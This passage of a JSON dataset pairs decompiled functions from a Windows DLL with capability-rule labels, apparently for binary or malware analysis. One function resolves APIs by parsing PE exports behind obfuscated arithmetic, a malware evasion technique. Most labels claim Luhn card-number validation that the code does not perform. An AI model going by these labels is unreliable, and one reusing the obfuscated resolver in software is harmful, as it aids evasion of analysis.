        "decompiled_code": "\nvoid fcn.180002ddc(void)\n\n{\n    ulong *puVar1;\n    ulong *arg1;\n    \n    arg1 = (*_sym.imp.KERNEL32.dll_InterlockedFlushSList)(0x1800913a0);\n    while (arg1 != NULL) {\n        puVar1 = *arg1;\n        fcn.18001458c(arg1);\n        arg1 = puVar1;\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "1800034b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800034b8(void)\n\n{\n    int64_t *piVar1;\n    \n    for (piVar1 = 0x18008c490; piVar1 < 0x18008c490; piVar1 = piVar1 + 1) {\n        if (*piVar1 != 0) {\n            (**0x180045380)();\n        }\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "1800034f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800034f4(void)\n\n{\n    int64_t *piVar1;\n    \n    for (piVar1 = 0x18008c4a0; piVar1 < 0x18008c4a0; piVar1 = piVar1 + 1) {\n        if (*piVar1 != 0) {\n            (**0x180045380)();\n        }\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "180003b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180003b94(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = *(arg1 + 0xc);\n    do {\n        if (uVar2 == 0) {\n            return 0;\n        }\n        uVar2 = uVar2 - 1;\n        iVar1 = fcn.1800055fc();\n        iVar1 = *(arg1 + 0x10) + *(iVar1 + 0x60) + uVar2 * 0x14;\n    } while ((arg2 <= *(iVar1 + 4)) || (*(iVar1 + 8) < arg2));\n    return iVar1;\n}\n",
        "token_count": 161
    },
    "180003e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.180003e90(int64_t *arg1, ulong *arg2, int64_t arg3, int64_t *arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    int32_t *piVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    int64_t iVar9;\n    int64_t iStackX8;\n    \n    uVar8 = *(arg3 + 0xc);\n    iVar2 = fcn.180005830(arg3, arg2);\n    *arg4 = *arg1;\n    do {\n        do {\n            if (uVar8 == 0) {\n                return arg4;\n            }\n            uVar8 = uVar8 - 1;\n            iVar7 = *(arg3 + 0x10) + uVar8 * 0x14 + arg2[1];\n        } while ((iVar2 <= *(iVar7 + 4)) || (*(iVar7 + 8) < iVar2));\n        puVar3 = (*_sym.imp.KERNEL32.dll_RtlLookupFunctionEntry)(*arg2, &iStackX8, 0);\n        uVar5 = 0;\n        iVar9 = *(iVar7 + 0x10) + iStackX8;\n        uVar1 = *(iVar7 + 0xc);\n        if (uVar1 != 0) {\n            piVar6 = iVar9 + 0xc;\n            do {\n                if (*piVar6 == *puVar3) break;\n                uVar4 = uVar5 + 1;\n                uVar5 = uVar4;\n                piVar6 = piVar6 + 5;\n            } while (uVar4 < uVar1);\n        }\n        if (uVar5 < uVar1) {\n            *arg4 = *(*(iVar9 + 0x10 + uVar5 * 0x14) + *arg1);\n            return arg4;\n        }\n    } while( true );\n}\n",
        "token_count": 460
    },
    "1800263b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800263b8(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    \n    if (arg1 < 0xffffffffffffffe1) {\n        if (arg1 == 0) {\n            arg1 = 1;\n        }\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x180091d88, 0, arg1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar1 = fcn.1800332a4();\n        } while ((iVar1 != 0) && (iVar1 = fcn.180014974(arg1),  iVar1 != 0));\n    }\n    puVar3 = fcn.180023574();\n    *puVar3 = 0xc;\n    return 0;\n}\n",
        "token_count": 197
    },
    "18000301": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.180003010(void)\n\n{\n    fcn.180016b84(0);\n    fcn.180005770();\n    return 1;\n}\n",
        "token_count": 36
    },
    "18000579": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180005794(int64_t *arg1, ulong *arg2, int64_t arg3)\n\n{\n    if (*(*(arg3 + 0x1c) + *arg1) == -2) {\n        fcn.180005840(arg3, arg2, *arg2);\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "18000584": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.180005840(int64_t arg1, int64_t arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    \n    if (arg1 != 0) {\n        iVar5 = *(arg1 + 0x18);\n        iVar1 = *(arg2 + 8);\n        if (iVar1 + iVar5 != 0) {\n            uVar3 = 0;\n            if (*(arg1 + 0x14) != 0) {\n                do {\n                    if (arg3 < *(iVar5 + uVar3 * 8 + iVar1) + iVar1) break;\n                    uVar4 = uVar3 + 1;\n                    uVar3 = uVar4;\n                } while (uVar4 < *(arg1 + 0x14));\n                if (uVar3 != 0) {\n                    return *(iVar1 + (uVar3 - 1) * 8 + 4 + iVar5);\n                }\n            }\n            return 0xffffffff;\n        }\n    }\n    fcn.180016c34();\n    pcVar2 = swi(3);\n    uVar3 = (*pcVar2)();\n    return uVar3;\n}\n",
        "token_count": 290
    },
    "180008e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.180008e50(ulong *arg1, char *arg2)\n\n{\n    char *pcVar1;\n    uint64_t arg3;\n    uint32_t uVar2;\n    \n    arg3 = 0;\n    *arg1 = 0;\n    *(arg1 + 1) = 0;\n    if ((arg2 != NULL) && (pcVar1 = arg2,  *arg2 != '\\0')) {\n        do {\n            pcVar1 = pcVar1 + 1;\n            uVar2 = arg3 + 1;\n            arg3 = uVar2;\n        } while (*pcVar1 != '\\0');\n        if (uVar2 != 0) {\n            fcn.18000902c(arg1, arg2, arg3);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 181
    },
    "1800097f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.1800097fc(ulong *arg1, ulong *arg2, ulong arg3)\n\n{\n    *arg2 = *arg1;\n    *(arg2 + 1) = *(arg1 + 1);\n    fcn.180009944(arg2, arg3);\n    return arg2;\n}\n",
        "token_count": 70
    },
    "180010ab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.180010ab8(ulong *arg1)\n\n{\n    char cVar1;\n    ulong *puVar2;\n    int64_t aiStackX16 [3];\n    \n    aiStackX16[0] = 0;\n    cVar1 = **0x1800914b8;\n    while (cVar1 != '\\0') {\n        if (cVar1 == '@') {\n            puVar2 = fcn.1800010c0(aiStackX16);\n            *arg1 = *puVar2;\n            *(arg1 + 1) = 1;\n            return arg1;\n        }\n        if (0xf < cVar1 + 0xbfU) break;\n        *0x1800914b8 = *0x1800914b8 + 1;\n        aiStackX16[0] = aiStackX16[0] * 0x10 + cVar1 + -0x41;\n        cVar1 = **0x1800914b8;\n    }\n    *(arg1 + 1) = 0;\n    return arg1;\n}\n",
        "token_count": 240
    },
    "18001171": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.18001171c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    \n    puVar2 = fcn.180002de8();\n    iVar1 = fcn.1800230d8(*puVar2, arg1, arg2, arg3);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 108
    },
    "18001194": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180011940(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = *0x180091530;\n    while (uVar1 != 0) {\n        uVar1 = uVar1 - 1;\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(uVar1 * 0x28 + 0x180091508);\n        *0x180091530 = *0x180091530 - 1;\n    }\n    return 1;\n}\n",
        "token_count": 109
    },
    "18001210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180012100(ulong arg1, ulong *arg2)\n\n{\n    fcn.180008cf0(arg1, *arg2, 2);\n    return;\n}\n",
        "token_count": 41
    },
    "18001213": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180012130(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    ulong arg1_00;\n    \n    pcVar1 = fcn.180008cf0(arg1, arg2, arg4);\n    (*pcVar1)(arg3);\n    arg1_00 = fcn.180008d20();\n    fcn.180008cf0(arg1_00, arg2, 2);\n    return;\n}\n",
        "token_count": 108
    },
    "18001623": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180016238(int64_t *arg1)\n\n{\n    if (*arg1 != *0x1800918e8) {\n        fcn.180015fb8(*arg1);\n    }\n    return;\n}\n",
        "token_count": 50
    },
    "18001625": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180016254(int64_t *arg1)\n\n{\n    if (*arg1 != *0x1800918e0) {\n        fcn.180015fb8(*arg1);\n    }\n    return;\n}\n",
        "token_count": 50
    },
    "180015c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180015c58(void)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t arg1;\n    int64_t iVar3;\n    \n    uVar2 = 0;\n    if (*0x1800918d0 == 0) {\n        fcn.180028f8c();\n        arg1 = fcn.180029a3c();\n        if (arg1 == 0) {\n            uVar2 = 0xffffffff;\n        }\n        else {\n            iVar3 = fcn.180015d9c(arg1);\n            iVar1 = iVar3;\n            if (iVar3 == 0) {\n                uVar2 = 0xffffffff;\n                iVar3 = *0x1800918d0;\n                iVar1 = *0x1800918e8;\n            }\n            *0x1800918e8 = iVar1;\n            *0x1800918d0 = iVar3;\n            fcn.180026378(0);\n        }\n        fcn.180026378(arg1);\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 249
    },
    "1800168e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800168e0(ulong arg1, ulong arg2)\n\n{\n    ulong uStackX8;\n    ulong uStackX16;\n    ulong var_20h_2;\n    ulong var_28h;\n    ulong var_20h;\n    ulong *var_18h;\n    ulong *var_bp_10h;\n    \n    var_18h = &uStackX8;\n    var_bp_10h = &uStackX16;\n    var_28h._0_4_ = 2;\n    var_20h._0_4_ = 2;\n    uStackX8 = arg1;\n    uStackX16 = arg2;\n    fcn.1800164cc(&var_20h_2, &var_20h, &var_18h, &var_28h);\n    return;\n}\n",
        "token_count": 194
    },
    "180016b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.180016b84(void)\n\n{\n    fcn.18002413c();\n    return 1;\n}\n",
        "token_count": 27
    },
    "18002417": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180024170(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*arg2 != *0x180091928) && ((*0x180090898 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.18002ffb0(arg1);\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "1800241a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800241a4(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*arg2 != *0x180091b80) && ((*0x180090898 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.180028fec(arg1);\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "18002647": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18002647c(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = *0x180091b60;\n    while (uVar1 != 0) {\n        uVar1 = uVar1 - 1;\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(uVar1 * 0x28 + 0x180091930);\n        *0x180091b60 = *0x180091b60 - 1;\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "1800307b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800307bc(int64_t arg1)\n\n{\n    if (arg1 != 0) {\n        if (*(arg1 + 0x18) != *0x1800908b8) {\n            fcn.180026378(*(arg1 + 0x18));\n        }\n        if (*(arg1 + 0x20) != *0x1800908c0) {\n            fcn.180026378(*(arg1 + 0x20));\n        }\n        if (*(arg1 + 0x28) != *0x1800908c8) {\n            fcn.180026378(*(arg1 + 0x28));\n        }\n        if (*(arg1 + 0x30) != *0x1800908d0) {\n            fcn.180026378(*(arg1 + 0x30));\n        }\n        if (*(arg1 + 0x38) != *0x1800908d8) {\n            fcn.180026378(*(arg1 + 0x38));\n        }\n        if (*(arg1 + 0x40) != *0x1800908e0) {\n            fcn.180026378(*(arg1 + 0x40));\n        }\n        if (*(arg1 + 0x48) != *0x1800908e8) {\n            fcn.180026378(*(arg1 + 0x48));\n        }\n        if (*(arg1 + 0x68) != *0x180090908) {\n            fcn.180026378(*(arg1 + 0x68));\n        }\n        if (*(arg1 + 0x70) != *0x180090910) {\n            fcn.180026378(*(arg1 + 0x70));\n        }\n        if (*(arg1 + 0x78) != *0x180090918) {\n            fcn.180026378(*(arg1 + 0x78));\n        }\n        if (*(arg1 + 0x80) != *0x180090920) {\n            fcn.180026378(*(arg1 + 0x80));\n        }\n        if (*(arg1 + 0x88) != *0x180090928) {\n            fcn.180026378(*(arg1 + 0x88));\n        }\n        if (*(arg1 + 0x90) != *0x180090930) {\n            fcn.180026378(*(arg1 + 0x90));\n        }\n    }\n    return;\n}\n",
        "token_count": 540
    },
    "180030e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180030e30(int64_t *arg1)\n\n{\n    if (arg1 != NULL) {\n        if (*arg1 != *0x1800908a0) {\n            fcn.180026378(*arg1);\n        }\n        if (arg1[1] != *0x1800908a8) {\n            fcn.180026378(arg1[1]);\n        }\n        if (arg1[2] != *0x1800908b0) {\n            fcn.180026378(arg1[2]);\n        }\n        if (arg1[0xb] != *0x1800908f8) {\n            fcn.180026378(arg1[0xb]);\n        }\n        if (arg1[0xc] != *0x180090900) {\n            fcn.180026378(arg1[0xc]);\n        }\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "18003f79": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003f790(ulong param_1, ulong param_2, ulong param_3)\n\n{\n    fcn.18003f7f0(param_1, param_2, param_3, 0x1b);\n    return;\n}\n",
        "token_count": 58
    },
    "180040df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.180040df0(int16_t *arg1)\n\n{\n    if ((*arg1 == 0x5a4d) && (*(*(arg1 + 0x1e) + arg1) == 0x4550)) {\n        return *(*(arg1 + 0x1e) + arg1 + 6) == 0x20b;\n    }\n    return false;\n}\n",
        "token_count": 89
    },
    "18004133": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n\nulong fcn.180041330(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    code **ppcVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    int64_t *piStackX8;\n    int64_t *piStackX24;\n    int64_t *piStackX32;\n    ulong var_30h;\n    ulong var_40h;\n    ulong var_48h;\n    int64_t *piStack72;\n    ulong uStack64;\n    code **ppcStack56;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    iVar2 = (*_sym.imp.USER32.dll_CreateWindowExW)\n                      (0, 0x180092890, 0x180092960, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg1, 0);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    piStackX8 = NULL;\n    iVar1 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x18008a6f0, 0, 0x17, 0x18008a780, &piStackX8);\n    if (iVar1 < 0) {\n        *0x180092a28 = NULL;\n        return 0;\n    }\n    iVar1 = (**(*piStackX8 + 0x30))(piStackX8, iVar2);\n    piVar6 = piStackX8;\n    if (-1 < iVar1) {\n        piStack72 = NULL;\n        iVar1 = (***piStackX8)(piStackX8, 0x18008a5d0, &piStack72);\n        if (iVar1 < 0) {\n            (**(*piStackX8 + 0x10))();\n            *0x180092a28 = NULL;\n            return 0;\n        }\n        iVar1 = (**(*piStack72 + 0x20))(piStack72, 1);\n        if (iVar1 < 0) {\n            (**(*piStackX8 + 0x10))();\n            (**(*piStack72 + 0x10))();\n            *0x180092a28 = NULL;\n            return 0;\n        }\n        (**(*piStack72 + 0x10))();\n        piVar6 = piStackX8;\n        *0x180092a28 = piStackX8;\n        if (piStackX8 == NULL) {\n            return 0;\n        }\n        uStack64 = 0;\n        iVar1 = (**(*piStackX8 + 0x28))(piStackX8, &uStack64);\n        if (-1 < iVar1) {\n            piStackX24 = NULL;\n            iVar1 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x18008a758, 0, 0x17, 0x18008a6e0, &piStackX24);\n            if (-1 < iVar1) {\n                piStackX32 = NULL;\n                iVar1 = (***piStackX24)(piStackX24, 0x18008a718, &piStackX32);\n                piVar5 = piStackX24;\n                if (-1 < iVar1) {\n                    iVar1 = (**(*piVar6 + 0x48))(piVar6, 0, piStackX32);\n                    iVar3 = *piStackX24;\n                    if (-1 < iVar1) {\n                        iVar1 = (**(iVar3 + 0x30))(piStackX24, uStack64);\n                        if (-1 < iVar1) {\n                            (**(*piStackX32 + 0x10))();\n                            piVar6 = *0x180092a28;\n                            *0x180092958 = piStackX24;\n                            if (piStackX24 == NULL) goto code_r0x0001800414ec;\n                            if (*0x180092a28 != NULL) {\n                                ppcVar4 = fcn.180002500(0x20);\n                                ppcVar4[2] = NULL;\n                                *ppcVar4 = vtable.CSyncEventHandlerRTS.0;\n                                *(ppcVar4 + 1) = 1;\n                                *(ppcVar4 + 3) = 0;\n                                ppcStack56 = ppcVar4;\n                                iVar1 = (*_sym.imp.ole32.dll_CoCreateFreeThreadedMarshaler)(ppcVar4);\n                                if ((-1 < iVar1) &&\n                                   (iVar1 = (**(*piVar6 + 0x48))(piVar6, 0, ppcVar4),  piVar6 = *0x180092958, \n                                   -1 < iVar1)) {\n                                    *0x180092a30 = ppcVar4;\n                                    if (ppcVar4 == NULL) goto code_r0x000180041669;\n                                    if ((((*0x180092a28 != NULL) && (*0x180092958 != NULL)) &&\n                                        (iVar1 = (**(**0x180092a28 + 0x20))(*0x180092a28, 1),  ppcVar4 = *0x180092a30, \n                                        -1 < iVar1)) &&\n                                       ((iVar1 = (**(*piVar6 + 0x20))(piVar6, 1),  ppcVar4 = *0x180092a30,  -1 < iVar1\n                                        && (iVar1 = (**(*piVar6 + 0x70))(piVar6, 1),  ppcVar4 = *0x180092a30, \n                                           -1 < iVar1)))) {\n                                        (*_sym.imp.USER32.dll_ShowWindow)(iVar2, arg2);\n                                        (*_sym.imp.USER32.dll_UpdateWindow)(iVar2);\n                                        return 1;\n                                    }\n                                }\n                                (**(*ppcVar4 + 0x10))(ppcVar4);\n                            }\n                            *0x180092a30 = NULL;\ncode_r0x000180041669:\n                            (**(**0x180092a28 + 0x10))();\n                            *0x180092a28 = NULL;\n                            (**(**0x180092958 + 0x10))();\n                            *0x180092958 = NULL;\n                            return 0;\n                        }\n                        iVar3 = *piStackX24;\n                    }\n                    (**(iVar3 + 0x10))();\n                    piVar5 = piStackX32;\n                }\n                (**(*piVar5 + 0x10))();\n            }\n        }\n        *0x180092958 = NULL;\n        piVar6 = *0x180092a28;\n    }\ncode_r0x0001800414ec:\n    (**(*piVar6 + 0x10))();\n    *0x180092a28 = NULL;\n    return 0;\n}\n",
        "token_count": 1584
    },
    "180041fd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nint64_t fcn.180041fd0(int64_t arg1, int64_t arg2)\n\n{\n    char cVar1;\n    char cVar2;\n    int64_t iVar3;\n    char *pcVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    \n    iVar5 = *0x180090a70;\n    iVar11 = *0x180090a84;\n    iVar3 = *0x180090a7c;\n    iVar8 = *0x180090a80 * *0x180090a80 * *0x180090a70 * *0x180090a74 * 0x50 +\n            (*0x180090a78 * *0x180090a7c + iVar11) * 0xa0 + iVar5 * 0xf0 + *0x180090a84 * *0x180090a80 * 0x50 +\n            *0x180090a84 * *0x180090a7c * 0x50 + iVar3 * -0x50 + *0x180090a78 * 0x50 +\n            arg2 + *(((*0x180090a80 * 2 - iVar5) + iVar11 + iVar3 + *0x180090a80 * *0x180090a70) * 0x420 + 0x88 +\n                    arg2 + *(((((*0x180090a70 * *0x180090a70 * *0x180090a78 * *0x180090a74 * *0x180090a7c -\n                                *0x180090a78 * *0x180090a78 * *0x180090a78) - *0x180090a74 * *0x180090a74) -\n                              *0x180090a74) + iVar3 + iVar5 + *0x180090a80 * *0x180090a70) * 0x40 + 0x3c + arg2));\n    uVar10 = 0;\n    uVar6 = *(iVar8 + 0x18) +\n            ((((*0x180090a84 - (*0x180090a78 * *0x180090a7c + 1) * *0x180090a78) - *0x180090a74) * *0x180090a84 +\n              (*0x180090a70 + 1) * *0x180090a70 + (*0x180090a80 + 1) * *0x180090a78) - *0x180090a7c * *0x180090a7c) * 2;\n    if (uVar6 != 0) {\n        do {\n            pcVar4 = *(((*0x180090a80 * *0x180090a7c + ((iVar11 - iVar5) + *0x180090a74) * 2 + *(iVar8 + 0x20)) - iVar3)\n                       + *0x180090a78 + *0x180090a80 + arg2 +\n                      ((((*0x180090a7c * 2 -\n                         (*0x180090a84 * *0x180090a74 * *0x180090a74 + (*0x180090a78 + 1) * *0x180090a78) * *0x180090a84\n                         ) - ((*0x180090a84 + *0x180090a70) * *0x180090a78 + 2 + *0x180090a7c * *0x180090a7c) *\n                             *0x180090a70) - *0x180090a74) * 2 + uVar10) * 4) + arg2;\n            iVar7 = arg1 - pcVar4;\n            do {\n                cVar1 = *pcVar4;\n                cVar2 = pcVar4[iVar7];\n                if (cVar1 != cVar2) break;\n                pcVar4 = pcVar4 + 1;\n            } while (cVar2 != '\\0');\n            if (cVar1 == cVar2) {\n                return *(*(iVar8 + 0x1c) + arg2 + *(*(iVar8 + 0x24) + arg2 + uVar10 * 2) * 4) + arg2;\n            }\n            uVar9 = uVar10 + 1;\n            uVar10 = uVar9;\n        } while (uVar9 < uVar6);\n    }\n    return 0;\n}\n",
        "token_count": 1030
    },
    "18000583": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t fcn.180005830(int64_t arg1, uint64_t *arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    \n    if (arg1 != 0) {\n        iVar5 = *(arg1 + 0x18);\n        uVar2 = arg2[1];\n        if (uVar2 + iVar5 != 0) {\n            uVar4 = 0;\n            if (*(arg1 + 0x14) != 0) {\n                do {\n                    if (*arg2 < *(iVar5 + uVar4 * 8 + uVar2) + uVar2) break;\n                    uVar3 = uVar4 + 1;\n                    uVar4 = uVar3;\n                } while (uVar3 < *(arg1 + 0x14));\n                if (uVar4 != 0) {\n                    return *(uVar2 + (uVar4 - 1) * 8 + 4 + iVar5);\n                }\n            }\n            return 0xffffffff;\n        }\n    }\n    fcn.180016c34();\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 289
    },
    "18001492": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.180014920(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    \n    if (arg1 < 0xffffffffffffffe1) {\n        if (arg1 == 0) {\n            arg1 = 1;\n        }\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x180091d88, 0, arg1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar1 = fcn.1800332a4();\n        } while ((iVar1 != 0) && (iVar1 = fcn.180014974(arg1),  iVar1 != 0));\n    }\n    puVar3 = fcn.180023574();\n    *puVar3 = 0xc;\n    return 0;\n}\n",
        "token_count": 195
    },
    "18001501": {
        "rules": [
            "parse PE header"
        ],
        "decompiled_code": "\nvoid fcn.180015018(ulong arg1)\n\n{\n    code *pcVar1;\n    int16_t *piVar2;\n    int32_t *piVar3;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    uchar auStackX32 [8];\n    uchar auStack56 [4];\n    uint uStack52;\n    uint auStack48 [2];\n    uint *puStack40;\n    int32_t *piStack32;\n    uchar *puStack24;\n    \n    aiStackX24[0] = 0;\n    auStackX16[0] = 2;\n    piVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((((piVar2 != NULL) && (*piVar2 == 0x5a4d)) && (piVar3 = *(piVar2 + 0x1e) + piVar2,  *piVar3 == 0x4550)) &&\n       (((*(piVar3 + 6) == 0x20b && (0xe < piVar3[0x21])) && (piVar3[0x3e] != 0)))) {\n        fcn.180014fbc(arg1);\n    }\n    puStack40 = auStackX16;\n    auStackX32[0] = 0;\n    piStack32 = aiStackX24;\n    puStack24 = auStackX32;\n    uStack52 = 2;\n    auStack48[0] = 2;\n    fcn.180014c90(auStack56, auStack48, &puStack40, &uStack52);\n    if (aiStackX24[0] == 0) {\n        fcn.180014eec(arg1);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 412
    }
}